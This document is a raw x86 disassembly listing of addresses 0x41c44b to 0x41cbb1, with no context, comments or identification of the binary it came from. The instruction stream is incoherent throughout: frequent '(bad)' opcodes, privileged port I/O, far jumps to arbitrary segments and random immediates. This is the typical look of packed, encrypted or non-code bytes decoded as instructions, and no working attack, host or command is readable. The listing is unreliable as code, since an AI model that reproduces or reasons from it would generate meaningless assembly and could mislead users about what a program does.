  41c44b:	fwait
  41c44c:	inc    ebp
  41c44d:	xchg   edx,eax
  41c44e:	pop    DWORD PTR [ecx]
  41c450:	jmp    0xade9:0x5352db52
  41c457:	jge    0x41c3fb
  41c459:	lahf   
  41c45a:	push   esi
  41c45b:	ret    0x3870
  41c45e:	bound  ebp,QWORD PTR [ebp-0x16af4dec]
  41c464:	fst    QWORD PTR [ebp+0x559fd172]
  41c46a:	pop    edi
  41c46b:	sub    eax,0x11865ca1
  41c470:	and    ecx,0x70
  41c473:	out    dx,al
  41c474:	mov    bh,0xd2
  41c476:	xchg   edi,eax
  41c477:	xchg   esp,eax
  41c478:	dec    ebx
  41c479:	shr    BYTE PTR [ebx+eax*8],cl
  41c47c:	xbegin 0x33d42767
  41c482:	sti    
  41c483:	es aaa 
  41c485:	outs   dx,DWORD PTR ds:[esi]
  41c486:	adc    dl,dh
  41c488:	adc    eax,0x8ab7a16b
  41c48d:	data16 data16 daa 
  41c490:	out    dx,al
  41c491:	jns    0x41c4ad
  41c493:	jno    0x41c4b2
  41c495:	scas   eax,DWORD PTR es:[edi]
  41c496:	dec    esi
  41c497:	jp     0x41c454
  41c499:	jge    0x41c4ff
  41c49b:	lea    eax,ds:0xd99c962
  41c4a1:	mov    ebx,0x994422b8
  41c4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4a7:	daa    
  41c4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4a9:	popf   
  41c4aa:	pop    ds
  41c4ab:	and    eax,0x37d83bea
  41c4b0:	sar    al,0x3a
  41c4b3:	ins    DWORD PTR es:[edi],dx
  41c4b4:	je     0x41c473
  41c4b6:	push   ebx
  41c4b7:	mov    ecx,0x9034ef0
  41c4bc:	inc    ebx
  41c4bd:	(bad)  
  41c4bf:	push   ebx
  41c4c0:	jecxz  0x41c488
  41c4c2:	xchg   ecx,eax
  41c4c3:	jae    0x41c517
  41c4c5:	dec    esp
  41c4c6:	pusha  
  41c4c7:	cmp    eax,0x4c2f9b37
  41c4cc:	mov    esp,0x9acc984c
  41c4d1:	jmp    0x564425cf
  41c4d6:	arpl   WORD PTR [eax+edx*8],sp
  41c4d9:	cmp    BYTE PTR [edx-0x80],al
  41c4dc:	push   esp
  41c4dd:	lea    ebp,[ebx*8+0x427c3733]
  41c4e4:	and    bh,dh
  41c4e6:	leave  
  41c4e7:	mov    esp,0x57856bb7
  41c4ec:	rcr    dl,cl
  41c4ee:	test   eax,0x764084f1
  41c4f3:	cli    
  41c4f4:	(bad)  
  41c4f5:	out    dx,al
  41c4f6:	leave  
  41c4f7:	mov    al,ds:0x6f8236cb
  41c4fc:	jae    0x41c548
  41c4fe:	xchg   esi,eax
  41c4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c500:	pop    ebp
  41c501:	(bad)  
  41c503:	clc    
  41c504:	mov    BYTE PTR [ebp-0x4ad966ad],ah
  41c50a:	inc    edx
  41c50b:	pop    esp
  41c50c:	xchg   esp,eax
  41c50d:	dec    edi
  41c50e:	stos   DWORD PTR es:[edi],eax
  41c50f:	test   eax,0xcff4363
  41c514:	stc    
  41c515:	push   0x6db5aa69
  41c51a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41c51c:	fst    DWORD PTR ds:0x7ead321e
  41c522:	mov    esp,0xb3bbb46b
  41c527:	cmp    al,al
  41c529:	push   ds
  41c52a:	fmul   st(3),st
  41c52c:	mov    bh,0x55
  41c52e:	jnp    0x41c509
  41c530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c531:	data16 jecxz 0x41c56a
  41c534:	and    DWORD PTR [eax+eiz*4-0xd],edx
  41c538:	push   0x68
  41c53a:	sub    esi,edx
  41c53c:	loop   0x41c59b
  41c53e:	int3   
  41c53f:	jl     0x41c4c4
  41c541:	push   0x967c185b
  41c546:	dec    ecx
  41c547:	xor    al,ah
  41c549:	addr16 sahf 
  41c54b:	pop    ecx
  41c54c:	rcl    DWORD PTR ds:0x527477ba,0x22
  41c553:	xchg   ch,al
  41c555:	icebp  
  41c556:	pop    ecx
  41c557:	and    cl,BYTE PTR [ebx+ebx*1]
  41c55a:	mov    al,0xc0
  41c55c:	and    DWORD PTR [eax-0x2d588bcd],0x4f2c4f83
  41c566:	call   0x64dd7f
  41c56b:	inc    ebx
  41c56c:	add    al,0xe9
  41c56e:	sub    ebx,eax
  41c570:	clc    
  41c571:	fwait
  41c572:	cmp    al,0xbf
  41c574:	xchg   edi,eax
  41c575:	nop
  41c576:	fwait
  41c577:	imul   dl
  41c579:	dec    edx
  41c57a:	pop    edx
  41c57b:	dec    ebp
  41c57c:	xchg   ecx,eax
  41c57d:	stc    
  41c57e:	scas   eax,DWORD PTR es:[edi]
  41c57f:	cmp    ch,BYTE PTR [edx+0x1e2b0916]
  41c585:	xchg   esi,eax
  41c586:	mov    esi,0x968decc2
  41c58b:	add    eax,0x633ce972
  41c590:	jge    0x41c530
  41c592:	jmp    0x74acc643
  41c597:	add    esp,DWORD PTR [ebp+0x28d25938]
  41c59d:	jmp    0x41c54d
  41c59f:	xor    DWORD PTR [ebp+0x7ad903f9],0xffffffc2
  41c5a6:	lock shl BYTE PTR [ebx-0x5d],1
  41c5aa:	mov    edi,0x55337e43
  41c5af:	stos   BYTE PTR es:[edi],al
  41c5b0:	dec    ebp
  41c5b1:	sbb    cl,0x49
  41c5b4:	xchg   ebp,eax
  41c5b5:	mov    dh,0x6b
  41c5b7:	push   edi
  41c5b8:	adc    BYTE PTR [eax+0x7d],cl
  41c5bb:	push   0xb8d175a2
  41c5c0:	push   edi
  41c5c1:	inc    esi
  41c5c2:	shl    esp,0x94
  41c5c5:	clc    
  41c5c6:	push   ds
  41c5c7:	cmp    BYTE PTR [edx+0x5e4c1cc9],0x13
  41c5ce:	popf   
  41c5cf:	test   DWORD PTR [edi+0x4bb1545],edx
  41c5d5:	daa    
  41c5d6:	int    0x10
  41c5d8:	stos   DWORD PTR es:[edi],eax
  41c5d9:	dec    ebp
  41c5da:	int    0xdb
  41c5dc:	or     bh,cl
  41c5de:	inc    edi
  41c5df:	lahf   
  41c5e0:	in     al,dx
  41c5e1:	popa   
  41c5e2:	pop    ebx
  41c5e3:	cmp    al,0x1d
  41c5e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5e6:	es inc ebp
  41c5e8:	aad    0x67
  41c5ea:	or     eax,0xd8944528
  41c5ef:	pop    edi
  41c5f0:	push   edi
  41c5f1:	inc    esi
  41c5f2:	mov    esp,DWORD PTR [ebx]
  41c5f4:	mov    dh,0xec
  41c5f6:	imul   ecx,DWORD PTR [ebx+0x54],0x5607bf0e
  41c5fd:	data16 loope 0x41c5bb
  41c600:	cmp    bl,BYTE PTR [eax]
  41c602:	out    0x95,al
  41c604:	enter  0x5f69,0xf0
  41c608:	fwait
  41c609:	and    DWORD PTR [ebp-0x48],ebp
  41c60c:	push   ebp
  41c60d:	adc    ebp,esi
  41c60f:	xlat   BYTE PTR ds:[ebx]
  41c610:	cmp    cl,BYTE PTR ds:0xcc7282ff
  41c616:	nop
  41c617:	mov    ecx,0x3870a546
  41c61c:	or     al,0xf0
  41c61e:	cld    
  41c61f:	imul   ecx,DWORD PTR [eax+0x676ac9af],0xb2d25d51
  41c629:	mov    ds:0x25160991,eax
  41c62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c62f:	fdivr  QWORD PTR [ebx+0x6d86873f]
  41c635:	mov    al,0xd3
  41c637:	in     al,dx
  41c638:	xor    esp,DWORD PTR [eax+0x3cfddd29]
  41c63e:	in     eax,dx
  41c63f:	xchg   bl,ah
  41c641:	mov    ch,0x86
  41c643:	dec    DWORD PTR [ebx-0x51ce0245]
  41c649:	pushf  
  41c64a:	mov    bh,0x8f
  41c64c:	pusha  
  41c64d:	sub    eax,0xf4ae5503
  41c652:	ja     0x41c60a
  41c654:	or     ebp,ebx
  41c656:	mov    ds:0xbe8c677a,al
  41c65b:	cs loopne 0x41c5f6
  41c65e:	inc    edx
  41c65f:	mov    dh,0xaa
  41c661:	inc    esp
  41c662:	pushf  
  41c663:	xor    DWORD PTR [esi],0x614087a6
  41c669:	(bad)  
  41c66a:	enter  0x6da2,0x3b
  41c66e:	stc    
  41c66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c670:	pop    eax
  41c671:	add    al,0x6e
  41c673:	dec    esp
  41c674:	dec    esi
  41c675:	ret    
  41c676:	pop    ebp
  41c677:	fs add al,0xcb
  41c67a:	xchg   DWORD PTR [esi-0xb],esi
  41c67d:	loopne 0x41c6ed
  41c67f:	retf   
  41c680:	idiv   BYTE PTR [esi]
  41c682:	(bad)  
  41c683:	ror    BYTE PTR [ecx-0x7ed12f49],1
  41c689:	mov    esi,0x1b6186be
  41c68e:	ret    
  41c68f:	arpl   WORD PTR [edx+0x724be8a5],bp
  41c695:	push   ecx
  41c696:	jbe    0x41c660
  41c698:	mov    ebp,0x6442420
  41c69d:	dec    esp
  41c69e:	nop
  41c69f:	fwait
  41c6a0:	sar    DWORD PTR [edx],cl
  41c6a2:	jp     0x41c68c
  41c6a4:	sub    eax,0x31321d25
  41c6a9:	pusha  
  41c6aa:	nop
  41c6ab:	xchg   ecx,eax
  41c6ac:	ret    
  41c6ad:	fimul  WORD PTR [ecx+0x5]
  41c6b0:	inc    esp
  41c6b1:	jge    0x41c6f9
  41c6b3:	cld    
  41c6b4:	neg    BYTE PTR [ecx]
  41c6b6:	lods   eax,DWORD PTR ds:[esi]
  41c6b7:	sub    al,0x64
  41c6b9:	inc    eax
  41c6ba:	mov    ebp,0x7da8742b
  41c6bf:	xchg   ebp,eax
  41c6c0:	lea    edi,[eax+0x35feee37]
  41c6c6:	test   BYTE PTR [ebp-0x3899ba31],0xd8
  41c6cd:	push   ds
  41c6ce:	dec    ebp
  41c6cf:	ss push edi
  41c6d1:	jg     0x41c6f3
  41c6d3:	pop    ebp
  41c6d4:	lock cmp bl,cl
  41c6d7:	or     BYTE PTR [esi],0x48
  41c6da:	jno    0x41c67b
  41c6dc:	scas   eax,DWORD PTR es:[edi]
  41c6dd:	pop    ecx
  41c6de:	es inc ebp
  41c6e0:	ja     0x41c6e7
  41c6e2:	aad    0xf4
  41c6e4:	mov    ah,0x7c
  41c6e6:	or     DWORD PTR [edi-0x1bcac310],ecx
  41c6ec:	sbb    al,0x94
  41c6ee:	fstp   st(4)
  41c6f0:	aam    0x68
  41c6f2:	je     0x41c719
  41c6f4:	mov    esi,DWORD PTR [eax-0x7ff21c0e]
  41c6fa:	and    DWORD PTR [esi-0x69],ecx
  41c6fd:	mov    ecx,0x524f1b33
  41c702:	fnsave [esi+0x740cc44b]
  41c708:	repnz pop edi
  41c70a:	lock mov WORD PTR [edx],ss
  41c70d:	fild   DWORD PTR [ebp-0x72]
  41c710:	dec    eax
  41c711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c712:	pop    esi
  41c713:	fst    DWORD PTR [esp+ebx*1+0x66]
  41c717:	nop
  41c718:	test   DWORD PTR [eax+0x60],esi
  41c71b:	jl     0x41c751
  41c71d:	lea    edi,[edi+0x58ea001b]
  41c723:	out    dx,eax
  41c724:	push   ecx
  41c725:	shr    BYTE PTR [edx-0x3f],cl
  41c728:	or     BYTE PTR [ecx+eiz*2+0x73031cb0],al
  41c72f:	nop
  41c730:	fwait
  41c731:	xchg   ebp,eax
  41c732:	add    al,0xb0
  41c734:	scas   al,BYTE PTR es:[edi]
  41c735:	inc    edx
  41c736:	fistp  DWORD PTR [esi+eiz*2]
  41c739:	(bad)  
  41c73a:	in     al,0x4d
  41c73c:	and    eax,0x47977a1e
  41c741:	add    eax,0x34f69ad0
  41c746:	aaa    
  41c747:	inc    edi
  41c748:	sar    BYTE PTR [esi+0x7b4fee6],cl
  41c74e:	inc    esp
  41c74f:	loop   0x41c700
  41c751:	mov    eax,0x689a6bc4
  41c756:	push   cs
  41c757:	int    0x75
  41c759:	add    bh,bl
  41c75b:	ds pop eax
  41c75d:	std    
  41c75e:	sbb    bl,BYTE PTR [ebx]
  41c760:	icebp  
  41c761:	push   ebp
  41c762:	in     eax,0xf2
  41c764:	or     ebp,DWORD PTR [ebp+0x799a8d75]
  41c76a:	fbld   TBYTE PTR [ebx]
  41c76c:	cli    
  41c76d:	dec    ebp
  41c76e:	pop    ds
  41c76f:	mov    dh,0x32
  41c771:	ds push ss
  41c773:	adc    edx,DWORD PTR [eax+edx*8+0x5d6314c6]
  41c77a:	pop    edi
  41c77b:	ror    BYTE PTR [esp+eax*4-0x71eff96f],0xe7
  41c783:	push   esp
  41c784:	add    BYTE PTR [ecx],bl
  41c786:	xchg   ebx,eax
  41c787:	or     bh,BYTE PTR [edi]
  41c789:	and    edi,DWORD PTR ds:0x9088240b
  41c78f:	daa    
  41c790:	or     ah,BYTE PTR [edi-0x1b]
  41c793:	add    DWORD PTR [eax-0x365e5503],esp
  41c799:	je     0x41c79f
  41c79b:	jae    0x41c7e1
  41c79d:	pop    esp
  41c79e:	enter  0xa702,0xea
  41c7a2:	dec    esi
  41c7a3:	lods   al,BYTE PTR ds:[esi]
  41c7a4:	inc    esp
  41c7a5:	arpl   WORD PTR [esi-0x44],dx
  41c7a8:	mov    ah,0xb6
  41c7aa:	and    eax,0x10e52521
  41c7af:	adc    eax,0xd12f3c46
  41c7b4:	jp     0x41c756
  41c7b6:	dec    ebp
  41c7b7:	sbb    al,0x19
  41c7b9:	dec    eax
  41c7ba:	mov    ds:0xde0242a3,al
  41c7bf:	ror    BYTE PTR [edi-0x1a],0x8
  41c7c3:	and    eax,0xe6ffad72
  41c7c8:	leave  
  41c7c9:	rol    BYTE PTR [eax-0x38],1
  41c7cc:	retf   
  41c7cd:	hlt    
  41c7ce:	adc    al,0x69
  41c7d0:	dec    eax
  41c7d1:	xchg   esp,eax
  41c7d2:	dec    edx
  41c7d3:	or     al,0xb0
  41c7d5:	fisub  DWORD PTR [ecx-0x54]
  41c7d8:	icebp  
  41c7d9:	xchg   edi,eax
  41c7da:	fstp   TBYTE PTR [ebx-0x67]
  41c7dd:	iret   
  41c7de:	iret   
  41c7df:	iret   
  41c7e0:	sbb    al,0xe8
  41c7e2:	int    0x1e
  41c7e4:	imul   DWORD PTR [eax+0x45a41ea4]
  41c7ea:	mov    ecx,fs
  41c7ec:	mov    dl,0xf9
  41c7ee:	pop    edx
  41c7ef:	shr    BYTE PTR [ebp+0x3c0dd5b6],0xc9
  41c7f6:	pop    esp
  41c7f7:	mov    ch,0x83
  41c7f9:	nop
  41c7fa:	jo     0x41c814
  41c7fc:	data16 (bad) 
  41c7fe:	outs   dx,BYTE PTR ds:[esi]
  41c7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c800:	mov    eax,ds:0x5fe21391
  41c805:	retf   0x2a45
  41c808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c809:	adc    bh,BYTE PTR [edi+0x52]
  41c80c:	popf   
  41c80d:	or     BYTE PTR [edi],al
  41c80f:	xor    eax,0xdafa091e
  41c814:	sti    
  41c815:	mov    ah,BYTE PTR [edx+0x5f]
  41c818:	inc    ecx
  41c819:	sub    ecx,DWORD PTR [ecx+0x239ea50d]
  41c81f:	imul   esi,ebp,0x96d1dd02
  41c825:	das    
  41c826:	in     eax,0x1
  41c828:	ret    0x9a5b
  41c82b:	jle    0x41c813
  41c82d:	adc    ebp,DWORD PTR [esi]
  41c82f:	scas   eax,DWORD PTR es:[edi]
  41c830:	add    ebx,DWORD PTR [edi+0x2e017350]
  41c836:	inc    edx
  41c837:	cdq    
  41c838:	xor    cl,dl
  41c83a:	popf   
  41c83b:	pop    esp
  41c83c:	test   BYTE PTR [ecx],cl
  41c83e:	mov    esi,0x47a7ed5e
  41c843:	ficomp DWORD PTR [esp+ebp*4]
  41c846:	in     eax,dx
  41c847:	cmp    edx,DWORD PTR [esi]
  41c849:	test   DWORD PTR [edx+0xa],esi
  41c84c:	lods   eax,DWORD PTR ds:[esi]
  41c84d:	ds or  eax,0x11e23a1c
  41c853:	pop    edi
  41c854:	sar    BYTE PTR [edi-0x2969dd0d],0xc5
  41c85b:	adc    al,0x58
  41c85d:	out    0x8b,al
  41c85f:	ins    DWORD PTR es:[edi],dx
  41c860:	mov    DWORD PTR [ebp+0x31],0x8706a7b1
  41c867:	pop    eax
  41c868:	sahf   
  41c869:	iret   
  41c86a:	xor    eax,0xd5f52d32
  41c86f:	out    0x91,eax
  41c871:	push   es
  41c872:	in     al,dx
  41c873:	ss sub al,0xde
  41c876:	stos   DWORD PTR es:[edi],eax
  41c877:	das    
  41c878:	mov    bl,0x25
  41c87a:	cmp    eax,0xad362df7
  41c87f:	fdiv   QWORD PTR [edi+eax*2-0x72]
  41c883:	dec    eax
  41c884:	adc    edi,edx
  41c886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c887:	sbb    al,0xe2
  41c889:	sub    eax,0x3edf958f
  41c88e:	sar    dx,cl
  41c891:	fist   DWORD PTR [edi-0x2b19c605]
  41c897:	xor    eax,0x5fe6eeed
  41c89c:	repz fadd QWORD PTR ds:0x655db074
  41c8a3:	xor    ebx,ebx
  41c8a5:	dec    eax
  41c8a6:	add    eax,0x5a7797d6
  41c8ab:	jmp    0x341c:0xc1c430ac
  41c8b2:	fild   WORD PTR [esi]
  41c8b4:	mov    edx,0x4e694e22
  41c8b9:	or     bh,dh
  41c8bb:	adc    BYTE PTR [esi+0x26],ah
  41c8be:	sub    eax,0xacdfd912
  41c8c3:	(bad)  
  41c8c4:	enter  0x1121,0xfd
  41c8c8:	into   
  41c8c9:	scas   al,BYTE PTR es:[edi]
  41c8ca:	in     eax,0xc1
  41c8cc:	push   eax
  41c8cd:	dec    ebx
  41c8ce:	(bad)  
  41c8cf:	jo     0x41c8bd
  41c8d1:	bnd ret 0xc034
  41c8d5:	retf   
  41c8d6:	aam    0x7e
  41c8d8:	jle    0x41c8be
  41c8da:	inc    esi
  41c8db:	push   cs
  41c8dc:	mov    WORD PTR [edi-0x10],fs
  41c8df:	adc    al,0xc7
  41c8e1:	cmp    BYTE PTR [edi+0x47],ch
  41c8e4:	inc    DWORD PTR [edi-0x7d]
  41c8e7:	sar    DWORD PTR [edi+0x67932d6c],cl
  41c8ed:	(bad)  
  41c8ee:	test   eax,0xaab58920
  41c8f3:	popa   
  41c8f4:	or     al,0x3f
  41c8f6:	push   esi
  41c8f7:	lds    edx,FWORD PTR [ebp-0x4a]
  41c8fa:	test   BYTE PTR [ecx],0x6e
  41c8fd:	enter  0xc67e,0xb7
  41c901:	mov    ds:0xf0c827bf,eax
  41c906:	and    al,0x41
  41c908:	jle    0x41c910
  41c90a:	xchg   edi,eax
  41c90b:	mov    ds:0xdcd80176,eax
  41c910:	pushf  
  41c911:	xor    bh,bh
  41c913:	add    BYTE PTR [eax+0x51],dl
  41c916:	add    al,0xb0
  41c918:	add    DWORD PTR [ebx],ebx
  41c91a:	nop
  41c91b:	popa   
  41c91c:	iret   
  41c91d:	fld    QWORD PTR [ebp+0x78089dc8]
  41c923:	leave  
  41c924:	popa   
  41c925:	jge    0x41c8eb
  41c927:	sbb    bl,BYTE PTR [ecx-0x35]
  41c92a:	mov    cl,0x8e
  41c92c:	mov    al,BYTE PTR [ebx]
  41c92e:	xor    ah,BYTE PTR [edi+0x1e]
  41c931:	test   al,0xc9
  41c933:	push   ebx
  41c934:	cmp    esp,DWORD PTR [edi+0x166a8669]
  41c93a:	jae    0x41c957
  41c93c:	ficomp DWORD PTR ds:0xe1adc6ef
  41c942:	mov    edi,0x9921e014
  41c947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c948:	test   al,0x8e
  41c94a:	xlat   BYTE PTR ds:[ebx]
  41c94b:	xor    ecx,edi
  41c94d:	pop    esi
  41c94e:	add    bl,BYTE PTR [edi]
  41c950:	jo     0x41c99d
  41c952:	jg     0x41c901
  41c954:	das    
  41c955:	ror    ecx,0x81
  41c958:	push   eax
  41c959:	fadd   DWORD PTR [edi-0x52]
  41c95c:	jecxz  0x41c8fd
  41c95e:	loopne 0x41c90f
  41c960:	cmc    
  41c961:	inc    edi
  41c962:	fld    TBYTE PTR [ecx]
  41c964:	jnp    0x41c979
  41c966:	xor    DWORD PTR [eax-0xc1bb918],ecx
  41c96c:	push   edi
  41c96d:	mov    dh,0xb6
  41c96f:	(bad)  
  41c970:	and    DWORD PTR [edx-0x65],edi
  41c973:	cmp    ebp,eax
  41c975:	loopne 0x41c927
  41c977:	cmp    eax,0x4451f21c
  41c97c:	inc    esp
  41c97d:	lea    esp,[edx-0x21]
  41c980:	sar    BYTE PTR [ebp+0x7b],0x60
  41c984:	in     al,0xb8
  41c986:	and    eax,0xb377fb30
  41c98b:	sub    al,0xb3
  41c98d:	iret   
  41c98e:	outs   dx,DWORD PTR ds:[esi]
  41c98f:	sbb    dl,al
  41c991:	addr16 inc ebx
  41c993:	into   
  41c994:	mov    edx,ebp
  41c996:	push   ecx
  41c997:	fs push edi
  41c999:	or     BYTE PTR [edi+0x11],al
  41c99c:	leave  
  41c99d:	mov    ebx,0x2f3199bd
  41c9a2:	ja     0x41c985
  41c9a4:	dec    edx
  41c9a5:	ror    BYTE PTR fs:[edx+0x5e],1
  41c9a9:	iret   
  41c9aa:	cmp    BYTE PTR [ebx],cl
  41c9ac:	cs xchg ebx,eax
  41c9ae:	js     0x41ca2f
  41c9b0:	adc    al,0x9a
  41c9b2:	xchg   ecx,eax
  41c9b3:	scas   al,BYTE PTR es:[edi]
  41c9b4:	scas   eax,DWORD PTR es:[edi]
  41c9b5:	mov    bl,0xc9
  41c9b7:	jno    0x41c98f
  41c9b9:	fisubr WORD PTR [eax]
  41c9bb:	push   0x176e1c4a
  41c9c0:	mov    ecx,0x4e9725ff
  41c9c5:	test   al,0x75
  41c9c7:	pop    ss
  41c9c8:	dec    esp
  41c9c9:	add    ebx,edx
  41c9cb:	pop    ebp
  41c9cc:	push   0x4e
  41c9ce:	push   ss
  41c9cf:	add    eax,0xa3f4b5ca
  41c9d4:	iret   
  41c9d5:	test   BYTE PTR [edi],ah
  41c9d7:	lds    ebx,FWORD PTR [esi+0x688a1ac7]
  41c9dd:	pop    es
  41c9de:	nop
  41c9df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9e0:	mov    esp,0xba57b44c
  41c9e5:	fild   DWORD PTR [ebx*2-0x176a08ba]
  41c9ec:	ss (bad) 
  41c9ef:	std    
  41c9f0:	ret    0x5c7c
  41c9f3:	mov    dh,0x4a
  41c9f5:	cs out 0x52,al
  41c9f8:	or     eax,0x1fa62756
  41c9fd:	popf   
  41c9fe:	sub    BYTE PTR [ecx],ah
  41ca00:	xor    esp,DWORD PTR [ebp-0x47]
  41ca03:	mov    BYTE PTR [edi+0x69],cl
  41ca06:	mov    dh,0x56
  41ca08:	sbb    eax,0xf0de1e1
  41ca0d:	sub    ch,BYTE PTR [edx]
  41ca0f:	sub    al,BYTE PTR [eax+0x26]
  41ca12:	jmp    0xba692a33
  41ca17:	(bad)  
  41ca18:	lea    ebx,[eax]
  41ca1a:	daa    
  41ca1b:	cdq    
  41ca1c:	icebp  
  41ca1d:	add    dh,ah
  41ca1f:	sbb    BYTE PTR [esi+0x2b],al
  41ca22:	xor    eax,0xc72bea86
  41ca27:	cdq    
  41ca28:	cld    
  41ca29:	cs cli 
  41ca2b:	clc    
  41ca2c:	daa    
  41ca2d:	gs add dh,0xe2
  41ca31:	dec    edx
  41ca32:	addr16 cld 
  41ca34:	dec    ebp
  41ca35:	cmp    BYTE PTR [edx-0x496ef93b],cl
  41ca3b:	scas   al,BYTE PTR es:[edi]
  41ca3c:	leave  
  41ca3d:	cmp    bh,BYTE PTR [eax+0x2f5e04db]
  41ca43:	repnz lods eax,DWORD PTR ds:[esi]
  41ca45:	sub    BYTE PTR [eax],cl
  41ca47:	adc    bl,BYTE PTR [edx]
  41ca49:	mov    bh,0xcb
  41ca4b:	out    0x97,al
  41ca4d:	mov    cl,0xb3
  41ca4f:	je     0x41cace
  41ca51:	push   ebx
  41ca52:	xchg   ebp,eax
  41ca53:	fisubr DWORD PTR [edi-0x6c183623]
  41ca59:	pusha  
  41ca5a:	cmp    esp,edx
  41ca5c:	dec    ecx
  41ca5d:	fstp   st(6)
  41ca5f:	jecxz  0x41cad6
  41ca61:	inc    ecx
  41ca62:	and    BYTE PTR [ecx+0x377c1559],dh
  41ca68:	rcl    BYTE PTR [ecx],1
  41ca6a:	and    ebp,DWORD PTR [edi+0x18]
  41ca6d:	inc    ebp
  41ca6e:	loopne 0x41ca02
  41ca70:	adc    BYTE PTR ds:0x84382692,bh
  41ca76:	push   ds
  41ca77:	imul   cl
  41ca79:	dec    ebp
  41ca7a:	lods   al,BYTE PTR ds:[esi]
  41ca7b:	imul   edx,eax,0x12
  41ca7e:	(bad)  
  41ca7f:	inc    DWORD PTR [ecx-0x30]
  41ca82:	adc    al,0xd6
  41ca84:	xor    al,0x96
  41ca86:	das    
  41ca87:	repnz repnz pop ebp
  41ca8a:	cs test eax,0x30ca7d88
  41ca90:	cwde   
  41ca91:	(bad)  
  41ca92:	outs   dx,DWORD PTR ds:[esi]
  41ca93:	or     eax,0x9c0cb07
  41ca98:	xor    BYTE PTR [edi-0x418901b6],dl
  41ca9e:	and    ebx,edi
  41caa0:	dec    edi
  41caa1:	push   ds
  41caa2:	cli    
  41caa3:	add    al,0x10
  41caa5:	adc    DWORD PTR [edx],edx
  41caa7:	push   ebx
  41caa8:	int    0xc
  41caaa:	dec    eax
  41caab:	xor    eax,DWORD PTR [ebp+0x5af8b24b]
  41cab1:	mov    si,0x3fe4
  41cab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab6:	mov    edx,0xdced2ddb
  41cabb:	lods   al,BYTE PTR ds:[esi]
  41cabc:	inc    ecx
  41cabd:	std    
  41cabe:	xchg   BYTE PTR fs:[esi-0x3],dl
  41cac2:	repnz lahf 
  41cac4:	mov    al,ds:0x9a86c6a9
  41cac9:	or     al,BYTE PTR [edx+0x9]
  41cacc:	mov    ds:0x289d561d,eax
  41cad1:	mov    dl,0x9f
  41cad3:	es lock out 0x88,al
  41cad7:	sub    ch,bh
  41cad9:	dec    esi
  41cada:	jecxz  0x41cae4
  41cadc:	add    eax,0xc91b0068
  41cae1:	icebp  
  41cae2:	stos   DWORD PTR es:[edi],eax
  41cae3:	into   
  41cae4:	lock sbb ah,dl
  41cae7:	rcl    BYTE PTR [ecx],0x99
  41caea:	xchg   ecx,eax
  41caeb:	bound  esp,QWORD PTR [edi]
  41caed:	push   esi
  41caee:	inc    edx
  41caef:	loop   0x41cabb
  41caf1:	mov    dh,0x48
  41caf3:	push   esi
  41caf4:	sub    edx,esp
  41caf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf7:	clc    
  41caf8:	ret    0x31bd
  41cafb:	lock cld 
  41cafd:	pop    ss
  41cafe:	rcr    DWORD PTR [ecx],1
  41cb00:	lds    ecx,FWORD PTR [edi-0x2e9c4743]
  41cb06:	imul   edi,DWORD PTR ds:0x895fa977,0x92052ade
  41cb10:	dec    ebx
  41cb11:	jmp    0x315e9cd4
  41cb16:	mov    ecx,0x23048d51
  41cb1b:	adc    BYTE PTR [edx],ah
  41cb1d:	fs out dx,al
  41cb1f:	jge    0x41cb35
  41cb21:	adc    cl,BYTE PTR [esp+ecx*4+0x18f6a144]
  41cb28:	out    0x5e,al
  41cb2a:	jae    0x41cb32
  41cb2c:	adc    ah,ch
  41cb2e:	xchg   ecx,eax
  41cb2f:	fiadd  WORD PTR [eax+0x46]
  41cb32:	cs mov esp,0x6860d23e
  41cb38:	je     0x41cb2b
  41cb3a:	test   DWORD PTR [ebx],ecx
  41cb3c:	push   0xffffffed
  41cb3e:	pusha  
  41cb3f:	mov    BYTE PTR [ecx+0x31],dh
  41cb42:	jmp    0x2e5a6a68
  41cb47:	hlt    
  41cb48:	shl    BYTE PTR [ebx],1
  41cb4a:	inc    esp
  41cb4b:	std    
  41cb4c:	push   ecx
  41cb4d:	push   esp
  41cb4e:	inc    eax
  41cb4f:	and    al,0x60
  41cb51:	pop    edi
  41cb52:	xchg   al,bh
  41cb54:	mov    al,0x22
  41cb56:	dec    ebp
  41cb57:	loopne 0x41cb90
  41cb59:	mov    dl,0x22
  41cb5b:	test   DWORD PTR [edi],0x461e30f2
  41cb61:	gs int3 
  41cb63:	cdq    
  41cb64:	adc    bl,BYTE PTR [eax-0x71f9dc78]
  41cb6a:	in     eax,dx
  41cb6b:	xchg   esi,eax
  41cb6c:	and    ebx,ecx
  41cb6e:	div    DWORD PTR [eax]
  41cb70:	jbe    0x41cb62
  41cb72:	in     eax,dx
  41cb73:	es add al,0xd3
  41cb76:	cmp    al,ah
  41cb78:	and    BYTE PTR [esi-0x1f],bl
  41cb7b:	jmp    DWORD PTR [eax+0x26173bb]
  41cb81:	jg     0x41cb57
  41cb83:	sbb    bh,ch
  41cb85:	jp     0x41cb12
  41cb87:	test   al,0x9c
  41cb89:	adc    al,0x3
  41cb8b:	jne    0x41cb9c
  41cb8d:	jbe    0x41cb18
  41cb8f:	push   ds
  41cb90:	ror    DWORD PTR [esi+0x31],0x7d
  41cb94:	xchg   BYTE PTR [esi+eiz*4],dh
  41cb97:	mov    BYTE PTR [esi+eax*8+0x50],bh
  41cb9b:	mov    ebx,0x7475d243
  41cba0:	xor    DWORD PTR ds:0xa5b7ef02,ebx
  41cba6:	xor    al,0xd7
  41cba8:	out    0x21,eax
  41cbaa:	mov    WORD PTR [eax+edi*1+0x30],cs
  41cbae:	retf   0x4828
  41cbb1:	out    dx,eax
